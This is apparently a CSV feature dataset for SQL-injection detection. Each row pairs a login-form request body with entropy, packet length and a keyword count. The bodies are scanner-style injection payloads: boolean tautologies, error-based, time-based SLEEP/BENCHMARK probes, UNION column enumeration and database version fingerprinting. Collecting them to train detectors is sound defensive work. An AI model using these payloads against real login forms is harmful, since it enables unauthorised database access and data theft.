,body,entropy,packet_length,sqli_keywords
256,uname=fdsfds&pass=fsdfsdf'))) AND 4426=4426#,4.081495471294327,60,7
257,uname=fdsfds&pass=fsdfsdf%' AND 1424=9494#,4.109595923232875,54,5
258,uname=fdsfds&pass=fsdfsdf%' AND 1424=9494#,4.109595923232875,54,5
259,uname=fdsfds&pass=fsdfsdf%' AND 4426=4426#,4.061976875613826,54,5
260,uname=fdsfds&pass=fsdfsdf%' AND 4426=4426#,4.061976875613826,54,5
261,"uname=fdsfds&pass=fsdfsdf"") AND 6520=2307#",4.252453066090017,54,5
262,"uname=fdsfds&pass=fsdfsdf"") AND 6520=2307#",4.252453066090017,54,5
263,"uname=fdsfds&pass=fsdfsdf"") AND 4426=4426#",4.061976875613826,54,5
264,"uname=fdsfds&pass=fsdfsdf"") AND 4426=4426#",4.061976875613826,54,5
265,"uname=fdsfds&pass=fsdfsdf"")) AND 2667=5810#",4.312908871424721,57,6
266,"uname=fdsfds&pass=fsdfsdf"")) AND 2667=5810#",4.312908871424721,57,6
267,"uname=fdsfds&pass=fsdfsdf"")) AND 4426=4426#",4.080350731889837,57,6
268,"uname=fdsfds&pass=fsdfsdf"")) AND 4426=4426#",4.080350731889837,57,6
269,"uname=fdsfds&pass=fsdfsdf""))) AND 1776=6144#",4.172404562203417,60,7
270,"uname=fdsfds&pass=fsdfsdf""))) AND 1776=6144#",4.172404562203417,60,7
271,"uname=fdsfds&pass=fsdfsdf""))) AND 4426=4426#",4.081495471294327,60,7
272,"uname=fdsfds&pass=fsdfsdf""))) AND 4426=4426#",4.081495471294327,60,7
273,uname=fdsfds&pass=fsdfsdf')) AS oulA WHERE 1401=1401 AND 5187=2372#,4.707973989566861,91,9
274,uname=fdsfds&pass=fsdfsdf')) AS DssI WHERE 4228=4228 AND 4426=4426#,4.392373287660495,91,9
275,"uname=fdsfds&pass=fsdfsdf"")) AS WKqA WHERE 8348=8348 AND 3210=2070#",4.67961377270283,91,9
276,"uname=fdsfds&pass=fsdfsdf"")) AS WKqA WHERE 8348=8348 AND 3210=2070#",4.67961377270283,91,9
277,"uname=fdsfds&pass=fsdfsdf"")) AS dIjl WHERE 3762=3762 AND 4426=4426#",4.599837982136466,91,9
278,"uname=fdsfds&pass=fsdfsdf"")) AS dIjl WHERE 3762=3762 AND 4426=4426#",4.599837982136466,91,9
279,uname=fdsfds&pass=fsdfsdf') AS dKqh WHERE 3145=3145 AND 6956=3291#,4.703432097176367,88,8
280,uname=fdsfds&pass=fsdfsdf') AS QZfC WHERE 4228=4228 AND 4426=4426#,4.47547177054581,88,8
281,"uname=fdsfds&pass=fsdfsdf"") AS WnnE WHERE 8735=8735 AND 1433=4245#",4.595170778574446,88,8
282,"uname=fdsfds&pass=fsdfsdf"") AS WnnE WHERE 8735=8735 AND 1433=4245#",4.595170778574446,88,8
283,"uname=fdsfds&pass=fsdfsdf"") AS qZVU WHERE 7453=7453 AND 4426=4426#",4.678652218033948,88,8
284,"uname=fdsfds&pass=fsdfsdf"") AS qZVU WHERE 7453=7453 AND 4426=4426#",4.678652218033948,88,8
285,uname=fdsfds&pass=fsdfsdf' IN BOOLEAN MODE) AND 6510=5790#,4.59946860789152,76,5
286,uname=fdsfds&pass=fsdfsdf' IN BOOLEAN MODE) AND 4426=4426#,4.461537573408762,76,5
287,uname=fdsfds&pass=fsdfsdf) AND 8988=9244#,4.07391321234758,51,4
288,uname=fdsfds&pass=fsdfsdf) AND 8988=9244#,4.07391321234758,51,4
289,uname=fdsfds&pass=fsdfsdf) AND 4426=4426#,3.9947641270344936,51,4
290,uname=fdsfds&pass=fsdfsdf) AND 4426=4426#,3.9947641270344936,51,4
291,uname=fdsfds&pass=fsdfsdf)) AND 1824=3021#,4.20483401847097,54,5
292,uname=fdsfds&pass=fsdfsdf)) AND 1824=3021#,4.20483401847097,54,5
293,uname=fdsfds&pass=fsdfsdf)) AND 4426=4426#,4.014357827994779,54,5
294,uname=fdsfds&pass=fsdfsdf)) AND 4426=4426#,4.014357827994779,54,5
295,uname=fdsfds&pass=fsdfsdf))) AND 8232=5673#,4.20233009230464,57,6
296,uname=fdsfds&pass=fsdfsdf))) AND 8232=5673#,4.20233009230464,57,6
297,uname=fdsfds&pass=fsdfsdf))) AND 4426=4426#,4.016283580676733,57,6
298,uname=fdsfds&pass=fsdfsdf))) AND 4426=4426#,4.016283580676733,57,6
299,uname=fdsfds&pass=fsdfsdf AND 3497=1983#,4.125070520364181,48,3
300,uname=fdsfds&pass=fsdfsdf AND 3497=1983#,4.125070520364181,48,3
301,uname=fdsfds&pass=fsdfsdf AND 4426=4426#,3.9250705203641814,48,3
302,uname=fdsfds&pass=fsdfsdf AND 4426=4426#,3.9250705203641814,48,3
303,uname=fdsfds&pass=fsdfsdf)) AS OWgh WHERE 1610=1610 AND 8543=6409#,4.708955248336977,88,8
304,uname=fdsfds&pass=fsdfsdf)) AS OWgh WHERE 1610=1610 AND 8543=6409#,4.708955248336977,88,8
305,uname=fdsfds&pass=fsdfsdf)) AS aLOU WHERE 3748=3748 AND 4426=4426#,4.606608468001167,88,8
306,uname=fdsfds&pass=fsdfsdf)) AS aLOU WHERE 3748=3748 AND 4426=4426#,4.606608468001167,88,8
307,uname=fdsfds&pass=fsdfsdf) AS VfTa WHERE 9074=9074 AND 6175=1578#,4.648764543564697,85,7
308,uname=fdsfds&pass=fsdfsdf) AS VfTa WHERE 9074=9074 AND 6175=1578#,4.648764543564697,85,7
309,uname=fdsfds&pass=fsdfsdf) AS BgYb WHERE 4439=4439 AND 4426=4426#,4.535764882519368,85,7
310,uname=fdsfds&pass=fsdfsdf) AS BgYb WHERE 4439=4439 AND 4426=4426#,4.535764882519368,85,7
311,uname=fdsfds&pass=fsdfsdf` WHERE 2893=2893 AND 8329=9189#,4.355015786839696,73,5
312,uname=fdsfds&pass=fsdfsdf` WHERE 2893=2893 AND 8329=9189#,4.355015786839696,73,5
313,uname=fdsfds&pass=fsdfsdf` WHERE 1931=1931 AND 4426=4426#,4.444830093484676,73,5
314,uname=fdsfds&pass=fsdfsdf` WHERE 1931=1931 AND 4426=4426#,4.444830093484676,73,5
315,uname=fdsfds&pass=fsdfsdf`) WHERE 7185=7185 AND 3773=4530#,4.536788055763941,76,6
316,uname=fdsfds&pass=fsdfsdf`) WHERE 7185=7185 AND 3773=4530#,4.536788055763941,76,6
317,uname=fdsfds&pass=fsdfsdf`) WHERE 7860=7860 AND 4426=4426#,4.49385314204544,76,6
318,uname=fdsfds&pass=fsdfsdf`) WHERE 7860=7860 AND 4426=4426#,4.49385314204544,76,6
319,uname=fdsfds&pass=-9621,3.82790978214397,23,1
320,uname=fdsfds&pass=-9621,3.82790978214397,23,1
321,uname=fdsfds&pass=-7995') OR 4199=6309#,4.455542527154549,51,6
322,uname=fdsfds&pass=-7423') OR 6352=6352#,4.406821128952238,51,6
323,uname=fdsfds&pass=-7207' OR 2423=3216#,4.385956789702441,48,5
324,uname=fdsfds&pass=-7207' OR 2423=3216#,4.385956789702441,48,5
325,uname=fdsfds&pass=-9004' OR 6352=6352#,4.4385883686498095,48,5
326,uname=fdsfds&pass=-7170' OR 9040=5689#,4.4713544870139295,48,5
327,uname=fdsfds&pass=-7170' OR 9040=5689#,4.4713544870139295,48,5
328,uname=fdsfds&pass=-4800' USymSOXIJM#,4.5588138903312,42,3
329,"uname=fdsfds&pass=-4784"" OR 5576=3056#",4.418722908066561,48,5
330,"uname=fdsfds&pass=-4784"" OR 5576=3056#",4.418722908066561,48,5
331,"uname=fdsfds&pass=-4619"" OR 6352=6352#",4.41872290806656,48,5
332,"uname=fdsfds&pass=-4619"" OR 6352=6352#",4.41872290806656,48,5
333,uname=fdsfds&pass=-8831')) OR 3522=1426#,4.484183719779189,54,7
334,uname=fdsfds&pass=-2688')) OR 6352=6352#,4.3653115322251015,54,7
335,uname=fdsfds&pass=-8606'))) OR 6708=8922#,4.4058556629435985,57,8
336,uname=fdsfds&pass=-6237'))) OR 6352=6352#,4.338663284842051,57,8
337,uname=fdsfds&pass=-5802%' OR 9896=4025#,4.496815359832416,51,6
338,uname=fdsfds&pass=-5802%' OR 9896=4025#,4.496815359832416,51,6
339,uname=fdsfds&pass=-4342%' OR 6352=6352#,4.355539077670187,51,6
340,uname=fdsfds&pass=-9662%' OR 7492=3597#,4.477459270033353,51,6
341,uname=fdsfds&pass=-9662%' OR 7492=3597#,4.477459270033353,51,6
342,uname=fdsfds&pass=-7190%' USymSOXIJM#,4.6689128250884115,45,4
343,"uname=fdsfds&pass=-9941"") OR 1935=5507#",4.458103180234289,51,6
344,"uname=fdsfds&pass=-9941"") OR 1935=5507#",4.458103180234289,51,6
345,"uname=fdsfds&pass=-3124"") OR 6352=6352#",4.406821128952238,51,6
346,"uname=fdsfds&pass=-3124"") OR 6352=6352#",4.406821128952238,51,6
347,"uname=fdsfds&pass=-4636"")) OR 9896=5286#",4.453055907333276,54,7
348,"uname=fdsfds&pass=-4636"")) OR 9896=5286#",4.453055907333276,54,7
349,"uname=fdsfds&pass=-1284"")) OR 6352=6352#",4.484183719779188,54,7
350,"uname=fdsfds&pass=-1284"")) OR 6352=6352#",4.484183719779188,54,7
351,"uname=fdsfds&pass=-1419""))) OR 1754=2389#",4.521828528850024,57,8
352,"uname=fdsfds&pass=-1419""))) OR 1754=2389#",4.521828528850024,57,8
353,"uname=fdsfds&pass=-2789""))) OR 6352=6352#",4.473048041045147,57,8
354,"uname=fdsfds&pass=-2789""))) OR 6352=6352#",4.473048041045147,57,8
355,uname=fdsfds&pass=-2801')) AS BXeF WHERE 9726=9726 OR 6212=5567#,4.814464015923012,88,10
356,uname=fdsfds&pass=-2997')) AS lohF WHERE 3506=3506 OR 6352=6352#,4.808364648336088,88,10
357,"uname=fdsfds&pass=-4476"")) AS fcWq WHERE 4845=4845 OR 9130=3534#",4.758969969293429,88,10
358,"uname=fdsfds&pass=-4476"")) AS fcWq WHERE 4845=4845 OR 9130=3534#",4.758969969293429,88,10
359,"uname=fdsfds&pass=-2975"")) AS dHPt WHERE 7982=7982 OR 6352=6352#",4.747828664259099,88,10
360,"uname=fdsfds&pass=-2975"")) AS dHPt WHERE 7982=7982 OR 6352=6352#",4.747828664259099,88,10
361,uname=fdsfds&pass=-2317') AS Ncvq WHERE 4610=4610 OR 6701=5498#,4.933241232852023,85,9
362,uname=fdsfds&pass=-6509') AS hPdd WHERE 9524=9524 OR 6352=6352#,4.697451503133396,85,9
363,"uname=fdsfds&pass=-6831"") AS hBNU WHERE 1268=1268 OR 8379=1724#",4.849985478918109,85,9
364,"uname=fdsfds&pass=-6831"") AS hBNU WHERE 1268=1268 OR 8379=1724#",4.849985478918109,85,9
365,"uname=fdsfds&pass=-4682"") AS tfpV WHERE 9683=9683 OR 6352=6352#",4.717215193575246,85,9
366,"uname=fdsfds&pass=-4682"") AS tfpV WHERE 9683=9683 OR 6352=6352#",4.717215193575246,85,9
367,uname=fdsfds&pass=-5436) OR 8763=5539#,4.398857447483312,48,5
368,uname=fdsfds&pass=-5436) OR 8763=5539#,4.398857447483312,48,5
369,uname=fdsfds&pass=-9654) OR 6352=6352#,4.346225868535943,48,5
370,uname=fdsfds&pass=-9654) OR 6352=6352#,4.346225868535943,48,5
371,uname=fdsfds&pass=-3713)) OR 6186=5152#,4.4261772187513015,51,6
372,uname=fdsfds&pass=-3713)) OR 6186=5152#,4.4261772187513015,51,6
373,uname=fdsfds&pass=-5045)) OR 6352=6352#,4.342969205986262,51,6
374,uname=fdsfds&pass=-5045)) OR 6352=6352#,4.342969205986262,51,6
375,uname=fdsfds&pass=-6768))) OR 6454=3846#,4.315311532225102,54,7
376,uname=fdsfds&pass=-6768))) OR 6454=3846#,4.315311532225102,54,7
377,uname=fdsfds&pass=-9507))) OR 6352=6352#,4.415311532225101,54,7
378,uname=fdsfds&pass=-9507))) OR 6352=6352#,4.415311532225101,54,7
379,uname=fdsfds&pass=-3684 OR 6293=5671#,4.465945933079575,45,4
380,uname=fdsfds&pass=-3684 OR 6293=5671#,4.465945933079575,45,4
381,uname=fdsfds&pass=-6534 OR 6352=6352#,4.208924987016684,45,4
382,uname=fdsfds&pass=-6534 OR 6352=6352#,4.208924987016684,45,4
383,uname=fdsfds&pass=-6465)) AS RXJx WHERE 2370=2370 OR 8344=2176#,4.833802145447413,85,9
384,uname=fdsfds&pass=-6465)) AS RXJx WHERE 2370=2370 OR 8344=2176#,4.833802145447413,85,9
385,uname=fdsfds&pass=-8078)) AS dOrP WHERE 4706=4706 OR 6352=6352#,4.774511074121862,85,9
386,uname=fdsfds&pass=-8078)) AS dOrP WHERE 4706=4706 OR 6352=6352#,4.774511074121862,85,9
387,uname=fdsfds&pass=-9332) AS tIRE WHERE 4142=4142 OR 4109=7980#,4.713972875071051,82,8
388,uname=fdsfds&pass=-9332) AS tIRE WHERE 4142=4142 OR 4109=7980#,4.713972875071051,82,8
389,uname=fdsfds&pass=-9364) AS rjXD WHERE 1200=1200 OR 6352=6352#,4.808719697344072,82,8
390,uname=fdsfds&pass=-9364) AS rjXD WHERE 1200=1200 OR 6352=6352#,4.808719697344072,82,8
391,uname=fdsfds&pass=fsdfsdf') OR NOT 8598=9788#,4.188982196705437,59,5
392,uname=fdsfds&pass=fsdfsdf') OR NOT 7205=7205#,4.233426641149881,59,5
393,uname=fdsfds&pass=fsdfsdf' OR NOT 6722=6848#,4.217859107657963,56,4
394,uname=fdsfds&pass=fsdfsdf' OR NOT 7205=7205#,4.172404562203417,56,4
395,uname=fdsfds&pass=fsdfsdf' OR NOT 7205=7205#,4.172404562203417,56,4
396,uname=fdsfds&pass=fsdfsdf' OR NOT 9104=5949#,4.2007025735178845,56,4
397,"uname=fdsfds&pass=fsdfsdf' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170766a71,(SELECT (ELT(5386=5386,1))),0x716a6b7671,0x78))s), 8446744073709551610, 8446744073709551610)))-- cjsx",5.020602453520514,267,33
398,"uname=fdsfds&pass=fsdfsdf' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170766a71,(SELECT (ELT(2342=2342,1))),0x716a6b7671,0x78))s), 8446744073709551610, 8446744073709551610)))-- sDis",5.0048599945798,266,33
399,"uname=fdsfds&pass=fsdfsdf' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7170766a71,(SELECT (ELT(1059=1059,1))),0x716a6b7671,0x78))x))-- LssK",5.013770151955871,194,26
400,"uname=fdsfds&pass=fsdfsdf' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7170766a71,(SELECT (ELT(1059=1059,1))),0x716a6b7671,0x78))x))-- LssK",5.013770151955871,194,26
401,"uname=fdsfds&pass=fsdfsdf' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7170766a71,(SELECT (ELT(6586=6586,1))),0x716a6b7671,0x78))x))-- doxA",4.972967732003506,193,26
402,"uname=fdsfds&pass=fsdfsdf' AND GTID_SUBSET(CONCAT(0x7170766a71,(SELECT (ELT(1695=1695,1))),0x716a6b7671),1695)-- prke",5.040201075400002,157,18
403,"uname=fdsfds&pass=(SELECT CONCAT(0x7170766a71,(ELT(1160=1160,1)),0x716a6b7671))",4.4909152809993635,105,13
404,"uname=fdsfds&pass=(SELECT CONCAT(0x7170766a71,(ELT(1160=1160,1)),0x716a6b7671))",4.4909152809993635,105,13
405,uname=fdsfds&pass=fsdfsdf';SELECT SLEEP(5)#,4.2374411389168944,55,7
406,uname=fdsfds&pass=fsdfsdf';SELECT SLEEP(5)-- fkEM,4.336563099562337,61,7
407,uname=fdsfds&pass=fsdfsdf';(SELECT * FROM (SELECT(SLEEP(5)))IScu)#,4.618046157427885,96,15
408,uname=fdsfds&pass=fsdfsdf';(SELECT * FROM (SELECT(SLEEP(5)))MSeu)-- nxIS,4.656123356168827,102,15
409,"uname=fdsfds&pass=fsdfsdf';SELECT BENCHMARK(5000000,MD5(0x59514a6d))#",4.863737276895113,87,11
410,"uname=fdsfds&pass=fsdfsdf';SELECT BENCHMARK(5000000,MD5(0x434e7675))-- Rztn",5.025076357995963,93,11
411,uname=fdsfds&pass=fsdfsdf' AND (SELECT 1429 FROM (SELECT(SLEEP(5)))SaDB)-- IGuF,4.865189096382869,109,14
412,uname=fdsfds&pass=fsdfsdf' AND (SELECT 1429 FROM (SELECT(SLEEP(5)))SaDB)-- IGuF,4.865189096382869,109,14
413,uname=fdsfds&pass=fsdfsdf' AND (SELECT 1429 FROM (SELECT(SLEEP(0)))SaDB)-- IGuF,4.865189096382869,109,14
414,uname=fdsfds&pass=fsdfsdf' AND (SELECT 1429 FROM (SELECT(SLEEP(0)))SaDB)-- IGuF,4.865189096382869,109,14
415,uname=fdsfds&pass=fsdfsdf' AND (SELECT 1429 FROM (SELECT(SLEEP(5)))SaDB)-- IGuF,4.865189096382869,109,14
416,uname=fdsfds&pass=fsdfsdf' AND (SELECT 1429 FROM (SELECT(SLEEP(5)))SaDB)-- IGuF,4.865189096382869,109,14
417,uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL#,4.237486508291452,61,5
418,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL#",4.245150697805498,68,6
419,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL#",4.200297609257071,75,7
420,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,NULL#",4.139883339614043,82,8
421,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#",4.073939076005297,89,9
422,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#",4.006968239389334,96,10
423,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#",3.941180953274224,103,11
424,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",3.8776730340829326,110,12
425,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",3.8169569128652574,117,13
426,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",3.75922754003168,124,14
427,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",3.70450442294331,131,15
428,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",3.652710765383128,138,16
429,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",3.6037188001067286,145,17
430,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",3.557376186351419,152,18
431,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",3.5135214723192467,159,19
432,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",3.4719930980224993,166,20
433,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",3.432634520629265,173,21
434,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",3.3952969891979032,180,22
435,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",3.35984088948489,187,23
436,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",3.326136222450946,194,24
437,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170766a71,0x7975464d62747a427a674742734e616c6449506d4d7467726a596d41477571505568717570507972,0x716a6b7671),NULL,NULL,NULL,NULL#",4.625055437505389,230,17
438,"uname=fdsfds&pass=fsdfsdf' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170766a71,0x7975464d62747a427a674742734e616c6449506d4d7467726a596d41477571505568717570507972,0x716a6b7671),NULL,NULL,NULL,NULL UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170766a71,0x6d715046726e507365776c4d564843756770646d52717a624c6e7962746f554d50574c4a544e515a,0x716a6b7671),NULL,NULL,NULL,NULL#",4.55307460474134,429,32
439,"uname=fdsfds' UNION ALL SELECT CONCAT(0x7170766a71,(CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END),0x716a6b7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL#&pass=fsdfsdf",4.894141288438003,245,30
440,"uname=fdsfds' UNION ALL SELECT CONCAT(0x7170766a71,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x716a6b7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL#&pass=fsdfsdf",4.898913498326982,239,30
441,"uname=fdsfds' UNION ALL SELECT CONCAT(0x7170766a71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x256472697a7a6c6525) THEN 1 ELSE 0 END),0x716a6b7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL#&pass=fsdfsdf",4.967037655825405,253,29
442,"uname=fdsfds' UNION ALL SELECT CONCAT(0x7170766a71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x716a6b7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL#&pass=fsdfsdf",4.941077782438107,253,29
443,"uname=fdsfds' UNION ALL SELECT CONCAT(0x7170766a71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x716a6b7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL#&pass=fsdfsdf",4.841228412757488,236,29
444,"uname=fdsfds' UNION ALL SELECT CONCAT(0x7170766a71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x716a6b7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL#&pass=fsdfsdf",4.841228412757488,236,29
